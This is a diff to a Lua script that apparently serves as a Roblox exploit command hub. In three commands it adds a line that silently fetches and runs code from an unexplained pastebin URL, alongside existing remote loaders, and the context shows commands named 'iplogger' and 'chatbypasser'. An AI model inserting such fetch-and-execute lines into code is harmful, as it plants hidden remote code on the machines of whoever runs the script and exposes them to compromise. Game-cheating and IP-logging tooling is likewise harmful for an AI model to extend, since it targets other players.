@@ -1718,6 +1718,7 @@ end
 	end
 	if Command("spookyware") or Command("reanim1") then
 		Notify("SpookyWare Loaded", Color3.fromRGB(0, 255 ,0), "Success")
+		loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/SpookyWare'),true))()
 	end
 	if Command("iplogger") or Command("iplog") then
@@ -1726,10 +1727,12 @@ end
 	end
 	if Command("scp") or Command("reanim2") then
 		Notify("FE Scp Loaded", Color3.fromRGB(0, 255 ,0), "Success")
+		loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/FE%20SCP'),true))()
 	end
 	if Command("fecat") or Command("reanim3") then
 		Notify("FE Cat Loaded", Color3.fromRGB(0, 255 ,0), "Success")
+		loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/FeCat'),true))()
 	end
 	if Command("chatbypasser") or Command("chatb") then
